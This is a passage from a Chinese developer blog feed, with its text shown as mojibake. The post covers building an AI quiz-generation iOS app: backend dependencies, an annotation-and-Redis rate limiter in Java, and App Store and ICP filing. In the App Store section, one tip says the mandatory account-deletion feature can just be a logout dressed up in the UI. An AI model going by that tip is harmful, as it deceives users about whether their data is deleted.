    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${mybatis-spring-boot-starter.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- MyBatis-PageHelper --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>pagehelper-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${pagehelper.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- Sa-Token --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.dev33<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>sa-token-spring-boot3-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${sa-token.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- Sa-Token æ•´åˆ RedisTemplate --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.dev33<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>sa-token-redis-template<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.42.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- æä¾› Redis è¿æ¥æ±  --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-pool2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- Lombok --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- Knife4j --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springdoc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springdoc-openapi-starter-webmvc-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.8.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.xiaoymin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>knife4j-openapi3-jakarta-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- çŸ­ä¿¡éªŒè¯ç  --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aliyun-java-auth<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.2.0-beta<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- é˜¿é‡Œäº‘çŸ­ä¿¡æœåŠ¡ SDK --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>dysmsapi20170525<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <span class="hljs-comment">&lt;!-- ä½¿ç”¨æœ€æ–°ç‰ˆ --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

      ......
</code></pre>
<p>è¿™ä¾èµ–ä¸€æ·»åŠ ï¼Œæ»¡æ»¡çš„å®‰å…¨æ„Ÿï¼š</p>
<ul>
<li>æ•°æ®åº“ï¼šæˆ‘æœ‰MyBatisã€‚</li>
<li>AIï¼šæˆ‘æœ‰LangChain4jã€‚</li>
<li>ç™»å½•é‰´æƒï¼šæˆ‘æœ‰Sa-Tokenã€‚</li>
<li>......</li>
</ul>
<h5 data-id="heading-10">2.2 æ¥å£é™æµ</h5>
<p>è¦è¯´åˆ°é¡¹ç›®ä¸­æœ€éœ€è¦é‡ç‚¹å…³æ³¨çš„éƒ¨åˆ†ï¼Œ<strong>æ¥å£é™æµ</strong> æ— ç–‘æ’åœ¨é¦–ä½ã€‚æ— è®ºæ˜¯çŸ­ä¿¡å‘é€æ¥å£ï¼Œè¿˜æ˜¯è°ƒç”¨ AI çš„æ¥å£ï¼Œä¸€æ—¦è¢«æ¶æ„åˆ·å–æˆ–æ»¥ç”¨ï¼Œéƒ½å¯èƒ½å¯¼è‡´èµ„æºè€—å°½ã€è´¹ç”¨çˆ†ç‚¸ğŸ’¥ã€‚</p>
<p>å› æ­¤ï¼Œæœ¬é¡¹ç›®é‡‡ç”¨ <strong>æ³¨è§£ + AOP + Redis</strong> çš„æ–¹å¼ï¼Œæ„å»ºäº†ä¸€å¥— <strong>è½»é‡çº§ã€å¯é…ç½®ã€ä½ä¾µå…¥</strong> çš„æ¥å£é™æµæ–¹æ¡ˆï¼Œåœ¨ä¸å½±å“ä¸šåŠ¡ä»£ç ç»“æ„çš„å‰æä¸‹ï¼Œå¯¹é«˜é£é™©æ¥å£è¿›è¡Œæœ‰æ•ˆä¿æŠ¤ï¼Œç¡®ä¿ç³»ç»Ÿåœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ä¾ç„¶ç¨³å®šå¯æ§ã€‚</p>
<hr/>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Target(ElementType.METHOD)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Documented</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> RateLimit {

    <span class="hljs-comment">/**
     * é™æµ key çš„å‰ç¼€ï¼ˆå”¯ä¸€æ ‡è¯†ä¸€ä¸ªé™æµç»´åº¦ï¼‰
     */</span>
    String <span class="hljs-title function_">key</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**
     * æ—¶é—´çª—å£ï¼Œå•ä½ç§’
     */</span>
    <span class="hljs-type">long</span> <span class="hljs-title function_">window</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-number">60</span>;

    <span class="hljs-comment">/**
     * æ—¶é—´çª—å£å†…å…è®¸çš„æœ€å¤§æ¬¡æ•°
     */</span>
    <span class="hljs-type">int</span> <span class="hljs-title function_">limit</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-number">10</span>;

    <span class="hljs-comment">/**
     * æ˜¯å¦æŒ‰ IP ç»´åº¦åŒºåˆ†é™æµ
     */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">perIp</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">false</span>;

    <span class="hljs-comment">/**
     * æ˜¯å¦æŒ‰ç”¨æˆ·ç»´åº¦åŒºåˆ†é™æµ
     */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">perUser</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">false</span>;

    <span class="hljs-comment">/**
     * è‡ªå®šä¹‰æç¤ºä¿¡æ¯
     */</span>
    String <span class="hljs-title function_">message</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">"è¯·æ±‚è¿‡äºé¢‘ç¹ï¼Œè¯·ç¨åå†è¯•"</span>;
}
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Aspect</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RateLimitAspect</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> RateLimitRedisUtil rateLimitRedisUtil;

    <span class="hljs-meta">@Around("@annotation(org.dxs.problemman.annotation.RateLimit)")</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">around</span><span class="hljs-params">(ProceedingJoinPoint joinPoint)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-type">MethodSignature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> (MethodSignature) joinPoint.getSignature();
        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> signature.getMethod();
        <span class="hljs-type">RateLimit</span> <span class="hljs-variable">rateLimit</span> <span class="hljs-operator">=</span> method.getAnnotation(RateLimit.class);

        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> buildKey(rateLimit);

        <span class="hljs-type">boolean</span> <span class="hljs-variable">allowed</span> <span class="hljs-operator">=</span> rateLimitRedisUtil.tryAcquire(
                key, rateLimit.limit(), rateLimit.window());

        <span class="hljs-keyword">if</span> (!allowed) {
            log.warn(<span class="hljs-string">"é™æµè§¦å‘ï¼škey={}, limit={}, window={}s"</span>, key, rateLimit.limit(), rateLimit.window());
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RateLimitException</span>(rateLimit.message());
        }

        <span class="hljs-keyword">return</span> joinPoint.proceed();
    }

    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">buildKey</span><span class="hljs-params">(RateLimit rateLimit)</span> {
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">"ratelimit:"</span>).append(rateLimit.key());
        <span class="hljs-keyword">if</span> (rateLimit.perIp()) {
            <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> IpUtils.getIpAddress();
            key.append(<span class="hljs-string">":"</span>).append(ip);
        }

        <span class="hljs-keyword">if</span> (rateLimit.perUser()) {
            <span class="hljs-type">String</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> StpUtil.getLoginIdAsString();
            key.append(<span class="hljs-string">":"</span>).append(userId);
        }
        <span class="hljs-keyword">return</span> key.toString();
    }
}
</code></pre>
<hr/>
<p>åœ¨ä½¿ç”¨ä¸Šï¼Œå¼€å‘è€…åªéœ€åœ¨éœ€è¦ä¿æŠ¤çš„æ¥å£æ–¹æ³•ä¸Šæ·»åŠ  <code>@RateLimit</code> æ³¨è§£ï¼Œå³å¯å£°æ˜è¯¥æ¥å£çš„é™æµè§„åˆ™ã€‚é€šè¿‡ <code>key</code> åŒºåˆ†ä¸åŒä¸šåŠ¡åœºæ™¯ï¼Œå¹¶å¯æŒ‰éœ€å¼€å¯ <strong>IP ç»´åº¦</strong> æˆ– <strong>ç”¨æˆ·ç»´åº¦</strong> çš„é™æµæ§åˆ¶ï¼Œä»è€Œç²¾ç¡®é™åˆ¶å•ä¸€æ¥æºæˆ–å•ä¸€ç”¨æˆ·çš„è®¿é—®é¢‘ç‡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@NotLogin</span>
<span class="hljs-meta">@PostMapping("/sms")</span>
<span class="hljs-meta">@RateLimit(key = "sms", limit = 200, window = 3600, message = "çŸ­ä¿¡è°ƒç”¨å¤ªé¢‘ç¹ï¼Œè¯·1å°æ—¶åå†è¯•")</span>
<span class="hljs-keyword">public</span> AjaxResult&lt;String&gt; <span class="hljs-title function_">sms</span><span class="hljs-params">(<span class="hljs-meta">@Validated</span> <span class="hljs-meta">@RequestBody</span> PhoneDTO dto)</span> {
    <span class="hljs-keyword">return</span> AjaxResult.success(loginService.sms(dto));

}
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PostMapping("/generate")</span>
<span class="hljs-meta">@RateLimit(key = "generate", limit = 3, perUser = true, window = 3600*24, message = "æ¯äººæ¯å¤©ä»…å¯ä½“éªŒä¸‰æ¬¡!")</span>
<span class="hljs-meta">@Operation(summary = "ä¾æ®æ¡ä»¶ï¼Œç”Ÿæˆé¢˜ç›®")</span>
<span class="hljs-keyword">public</span> AjaxResult&lt;Object&gt; <span class="hljs-title function_">generate</span><span class="hljs-params">(<span class="hljs-meta">@Validated</span> <span class="hljs-meta">@RequestBody</span> GenerateRequestDTO dto)</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException {
    questionService.generate(dto);
    <span class="hljs-keyword">return</span> AjaxResult.success();
}
</code></pre>
<p>è¯·æ±‚è¿›å…¥æ—¶ï¼ŒAOP åˆ‡é¢ä¼šæ‹¦æˆªå¸¦æœ‰ <code>@RateLimit</code> æ³¨è§£çš„æ–¹æ³•ï¼Œæ ¹æ®æ³¨è§£é…ç½®åŠ¨æ€æ„å»ºé™æµ Keyï¼Œå¹¶äº¤ç”± Redis è¿›è¡ŒåŸå­è®¡æ•°æ ¡éªŒï¼›è‹¥åœ¨æŒ‡å®šæ—¶é—´çª—å£å†…è¶…è¿‡è®¿é—®ä¸Šé™ï¼Œåˆ™ç›´æ¥ä¸­æ–­è¯·æ±‚å¹¶è¿”å›å‹å¥½çš„é™æµæç¤ºï¼ŒåŒæ—¶è®°å½•å‘Šè­¦æ—¥å¿—ï¼Œä¾¿äºåç»­æ’æŸ¥ä¸ç›‘æ§ã€‚</p>
<p>é™æµ Key çš„ç»“æ„ç»Ÿä¸€ä¸ºï¼š</p>
<pre><code class="hljs language-css" lang="css">ratelimit:{ä¸šåŠ¡key}:{ip}:{userId}
</code></pre>
<p>é€šè¿‡ Redis è¿‡æœŸæœºåˆ¶è‡ªç„¶å½¢æˆæ—¶é—´çª—å£ï¼Œæ—¢ä¿è¯äº†å¹¶å‘åœºæ™¯ä¸‹çš„å‡†ç¡®æ€§ï¼Œä¹Ÿé¿å…äº†é¢å¤–çš„æ¸…ç†æˆæœ¬ã€‚</p>
<h3 data-id="heading-11">ä¸‰. ä¸Šæ¶å¤‡æ¡ˆ</h3>
<h4 data-id="heading-12">1.å‰æ</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/083eac97b7a34a19b1588ada75dd4ad8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=EiFHmny2HNv8e1cVu%2FnNtwcVDs0%3D" alt="æˆªå±2025-12-08 21.51.13.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/353c5df231d5408080608a9de008d865~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=NlEUKn0bg7DMnZSag0nApsjkgOQ%3D" alt="æˆªå±2025-12-08 21.51.51.png" loading="lazy"/></p>
<p>æƒ³è¦å¤‡æ¡ˆä¸Šæ¶ï¼ŒåŸŸåå’ŒæœåŠ¡å™¨æ˜¯å¿…ä¸å¯å°‘çš„ã€‚</p>
<ul>
<li>åŸŸåï¼šä½ æ˜¯åœ¨æ‰‹æœºä¸Šï¼Œå…¶å®ä¸éœ€è¦å•¥å¥½åŸŸåï¼Œå› ä¸ºå¤§å®¶æ ¹æœ¬çœ‹ä¸è§ï¼Œåå‡ å—é’±ä¸€å¹´å°±è¡Œäº†ã€‚</li>
<li>æœåŠ¡å™¨ï¼šèŠ±äº†ä¸‰å››ç™¾ä¹°ä¸ªè½»é‡çº§æœåŠ¡å™¨å°±è¡Œäº†ã€‚</li>
</ul>
<h4 data-id="heading-13">2. é˜¿é‡Œäº‘å¤‡æ¡ˆ</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dee4bff186e44acbb17263b4634c33d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=%2B71bBFko6Z9SCmEpak4rgHRcW28%3D" alt="æˆªå±2025-12-08 22.02.14.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4dc6a93d8cc94525b5095b33588d6637~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=U2%2BVi0OSV2zLLWJo9F7I22K2Iic%3D" alt="æˆªå±2025-12-08 22.06.22.png" loading="lazy"/></p>
<blockquote>
<p>ğŸ’¡ <code>å°å»ºè®®</code><br/>
åƒè¿™é‡Œé˜¿é‡Œäº‘å¤‡æ¡ˆå’Œè·å–ç®¡å±€å®¡æ ¸ï¼Œå¯ä»¥å…ˆè¡Œä¸€æ­¥ï¼Œåœ¨appå¼€å‘å®Œä¹‹å‰å°±å¯ä»¥æäº¤äº†ã€‚<br/>
å› ä¸ºç®¡å±€å®¡æ ¸æ˜¯è¦2-3å‘¨çš„ï¼Œæœ‰å¯èƒ½æˆ‘ä»¬çš„å°APPå¼€å‘å¥½äº†ï¼Œå¤‡æ¡ˆå·éƒ½æ²¡æœ‰ä¸‹æ¥ã€‚</p>
</blockquote>
<h4 data-id="heading-14">3. è‹¹æœå•†åº—ä¸Šæ¶</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7f6fab876754a68b382d8b7e462eaf7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=PAvq6D5rHLixfkr1ZCelv2QHz7o%3D" alt="æˆªå±2025-12-09 14.44.38.png" loading="lazy"/></p>
<p>ä¿¡æ¯è¿™é‡ŒæŒ‰éƒ¨å°±ç­ï¼ŒæŒ‰ç…§æç¤ºï¼Œä¸€ç‚¹ç‚¹å¡«å†™å®Œæˆå°±è¡Œäº†ï¼Œæ²¡å•¥ç‰¹åˆ«çš„ã€‚</p>
<p><code>è¸©å‘æ€»ç»“</code>ï¼š</p>
<ul>
<li><strong>æµ‹è¯•è´¦å·</strong>ï¼šä½ çš„APPä¸­åªè¦æœ‰ç™»å½•æ¨¡å—ï¼Œå°±ä¸€å®šè¦æä¾›æµ‹è¯•è´¦å·ï¼Œå°±ç®—ä½ çº¯æ‰‹æœºå·ç™»å½•ä¹Ÿä¸è¡Œï¼Œå¿…é¡»æä¾›æµ‹è¯•è´¦å·ã€‚</li>
<li><strong>æ³¨é”€åŠŸèƒ½</strong>ï¼šè‹¹æœå•†åº—ç¡¬æ€§è¦æ±‚ï¼Œå¿…é¡»è¦æœ‰ <code>æ³¨é”€åŠŸèƒ½</code>ï¼Œä½†å…¶å®ä¹Ÿæ²¡é‚£ä¹ˆä¸¥æ ¼ï¼Œä½ åªè¦UIæ˜¾ç¤ºæ˜¯é‚£ä¹ˆå›äº‹å°±è¡Œï¼Œå°±å½“ <code>é€€å‡ºç™»å½•</code> åŠŸèƒ½å»åšå°±è¡Œäº†ã€‚</li>
</ul>
<h4 data-id="heading-15">4. é¢„è§ˆå›¾åˆ¶ä½œæ¨è</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4259d49b6821497a87643f795151d86d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=%2FGn14RBp%2B2TpiiY5QY8v%2FLoM7As%3D" alt="æˆªå±2025-12-09 16.47.09.png" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f7b46132b1843d584e67c72244aec3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=ymvkRQnEBTvkr6qmRtrqHnhBSp0%3D" alt="æˆªå±2025-12-09 16.46.11.png" loading="lazy"/></p>
<p align="center"> 
           <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d885c55b4fb49a6b4a256d422fbde9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=%2BOQKmXPfoaxUAScl80foPzYuvMQ%3D" width="100%" loading="lazy"/>
</p>
<blockquote>
<p>æ³¨æ„æ˜¯éœ€è¦è®¢é˜…ä»˜è´¹çš„ï¼Œè¦æ˜¯æœ‰ä»€ä¹ˆæ›´å¥½çš„ï¼Œå¸Œæœ›è¯„è®ºå‘ŠçŸ¥ã€‚ğŸ˜‚</p>
</blockquote>
<h2 data-id="heading-16">å±•æœ›</h2>
<p>åœ¨åç»­è§„åˆ’çš„æ–°åŠŸèƒ½ä¸­ï¼Œå°†ä»¥<strong>å¤§å­¦æœŸæœ«è€ƒè¯•å¤ä¹ </strong>ä½œä¸ºå…¸å‹åº”ç”¨åœºæ™¯è¿›è¡Œè®¾è®¡ã€‚é€šå¸¸åœ¨æœŸæœ«é˜¶æ®µï¼Œè€å¸ˆéƒ½ä¼šç»™å‡ºæ˜ç¡®çš„è€ƒè¯•èŒƒå›´ã€å¤ä¹ å¤§çº²ä»¥åŠç›¸å…³èµ„æ–™æ–‡æ¡£ï¼Œè€Œä¸´é˜µç£¨æªçš„å­¦ç”Ÿå¾€å¾€é¢ä¸´èµ„æ–™ç¹å¤šã€é‡ç‚¹åˆ†æ•£ã€ä¸çŸ¥ä»ä½•ä¸‹æ‰‹çš„é—®é¢˜ã€‚</p>
<p>é’ˆå¯¹è¿™ä¸€ç—›ç‚¹ï¼Œç”¨æˆ·å¯ä»¥å°†è€å¸ˆæä¾›çš„å¤ä¹ æ–‡æ¡£ç›´æ¥å¯¼å…¥ Appï¼Œç³»ç»Ÿä¼šåŸºäº AI å¯¹å†…å®¹è¿›è¡Œè‡ªåŠ¨è§£æä¸å½’çº³ï¼Œå°†é›¶æ•£çš„æ–‡æœ¬ä¿¡æ¯æ•´ç†ä¸º<strong>æ€ç»´å¯¼å›¾å½¢å¼çš„çŸ¥è¯†å›¾è°±</strong>ï¼Œæ¸…æ™°å‘ˆç°å„ç« èŠ‚ä¸çŸ¥è¯†ç‚¹ä¹‹é—´çš„å±‚çº§ä¸å…³è”å…³ç³»ã€‚</p>
<p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œç”¨æˆ·å¯å›´ç»•ä»»æ„çŸ¥è¯†èŠ‚ç‚¹ä¸€é”®ç”Ÿæˆå¯¹åº”é¢˜ç›®ï¼Œç”¨äºé’ˆå¯¹æ€§å¤ä¹ ä¸è‡ªæµ‹ï¼Œåšåˆ°<strong>å“ªé‡Œè–„å¼±ç»ƒå“ªé‡Œ</strong>ã€‚é€šè¿‡<code>æ–‡æ¡£ â†’ çŸ¥è¯†å›¾è°± â†’ é¢˜ç›®ç»ƒä¹ </code> çš„é—­ç¯æ–¹å¼ï¼Œå¸®åŠ©ç”¨æˆ·æ›´é«˜æ•ˆåœ°ç†è§£é‡ç‚¹å†…å®¹ï¼Œæå‡æœŸæœ«å¤ä¹ çš„é’ˆå¯¹æ€§ä¸æ•´ä½“æ•ˆç‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35b417d2198c42078dbeaccf6a858378~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=5FboRa4pjjpbYklOI6Ab6J0qrzo%3D" alt="46a1b81cde50407982da18d76b651dcf.gif" loading="lazy"/></p>
<blockquote>
<p>ğŸ˜­ ä½œä¸ºå¤§å­¦æ¯•ä¸šç”Ÿçš„æ·±å½»æ„Ÿæ‚Ÿã€‚</p>
</blockquote>
<h2 data-id="heading-17">æ”¯æŒ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/078b69255afa4bd68f3ad65d8e674014~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876051&amp;x-signature=tGaZCpB%2Buf8VAWzzD6r7vetgMgU%3D" alt="ScreenRecording_12-08-2025 22-10-28_1.gif" loading="lazy"/></p>
<p><code>AppStore</code> æœç´¢ <code>å‡ºé¢˜ä¾ </code> å³å¯ï¼Œæ¯ä¸ªç”¨æˆ·æ¯å¤©å¯å…è´¹ä½¿ç”¨ä¸‰æ¬¡ã€‚</p>
<blockquote>
<p>æ„Ÿè°¢å¤§å®¶çš„æ”¯æŒä¸åé¦ˆã€‚ğŸ™</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è§£å†³ideaé”™è¯¯æç¤º:æ— æ³•è§£æ'è¡¨å']]></title>    <link>https://juejin.cn/post/7581658157145505842</link>    <guid>https://juejin.cn/post/7581658157145505842</guid>    <pubDate>2025-12-09T09:14:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581658157145505842" data-draft-id="7581648776303575049" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è§£å†³ideaé”™è¯¯æç¤º:æ— æ³•è§£æ'è¡¨å'"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-09T09:14:09.000Z"/> <meta itemprop="image" 